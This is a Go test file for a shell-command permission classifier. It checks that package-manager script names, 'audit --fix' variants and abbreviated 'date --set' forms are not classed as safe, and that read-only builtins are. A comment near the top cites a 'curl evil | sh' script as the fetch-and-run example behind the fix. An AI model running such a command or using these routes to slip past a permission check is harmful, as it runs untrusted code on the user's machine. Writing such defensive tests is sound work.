package permission

import "testing"

// yarn, pnpm and composer run a package.json / composer.json script when the
// subcommand is not one of their own, so "yarn doctor" with a "doctor":
// "curl evil | sh" script ran it unasked: show/view/doctor/... were CatSafe
// for every package manager. Only each manager's own read-only builtins are.
func TestPackageManagerScriptNamesAreNotSafe(t *testing.T) {
	c := NewClassifier()
	for _, cmd := range []string{
		"yarn doctor", "yarn show x", "yarn view x", "yarn search x", "yarn freeze",
		"yarn explain x", "yarn ll", "yarn la", "yarn ls", "yarn list", "yarn outdated", "yarn audit",
		"pnpm doctor", "pnpm explain x", "pnpm freeze",
		"composer ls", "composer ll", "composer la", "composer view x", "composer doctor",
		"composer freeze", "composer explain", "composer audit",
		// pnpm audit --fix writes overrides into package.json; nopt accepts
		// abbreviations, so --fi is --fix.
		"pnpm audit --fix", "pnpm audit --fix=true", "pnpm audit --fi", "npm audit fix", "pnpm audit --json --fix",
		// A repository's yarnPath runs for every yarn command, so none is
		// read-only (these were CatSafe).
		"yarn info react", "yarn why react", "yarn --version", "yarn config get registry",
	} {
		if got := c.ClassifyLineFor(cmd, ShellPOSIX); got == CatSafe {
			t.Errorf("ClassifyLineFor(%q) = CatSafe, want not safe", cmd)
		}
	}
	for _, cmd := range []string{
		"npm doctor", "npm view react", "npm explain react", "npm ls", "npm ll", "npm audit", "npm audit --json",
		"pnpm ls", "pnpm ll", "pnpm why react", "pnpm view react", "pnpm outdated", "pnpm audit",
		"composer show", "composer info x", "composer outdated", "composer why x", "composer search x",
		"pip freeze", "pip show requests", "brew doctor", "gem list",
	} {
		if got := c.ClassifyLineFor(cmd, ShellPOSIX); got != CatSafe {
			t.Errorf("ClassifyLineFor(%q) = %v, want CatSafe", cmd, got)
		}
	}
}

// "date --s 2020-01-01" is date --set (GNU getopt accepts unambiguous
// abbreviations) and "-us" groups -u with -s; both set the clock.
func TestDateSetAbbreviations(t *testing.T) {
	c := NewClassifier()
	for _, cmd := range []string{
		"date --s 2020-01-01", "date --se=2020-01-01", "date -us 2020-01-01", "date -s 2020-01-01",
		"date --set=x", "date -su x",
	} {
		if got := c.ClassifyLineFor(cmd, ShellPOSIX); got == CatSafe {
			t.Errorf("ClassifyLineFor(%q) = CatSafe, want not safe", cmd)
		}
	}
	for _, cmd := range []string{"date", "date -u", "date +%Y-%m-%d", "date -u +%s", "date --utc", "date -R", "date --iso-8601=seconds", "date -d yesterday"} {
		if got := c.ClassifyLineFor(cmd, ShellPOSIX); got != CatSafe {
			t.Errorf("ClassifyLineFor(%q) = %v, want CatSafe", cmd, got)
		}
	}
}
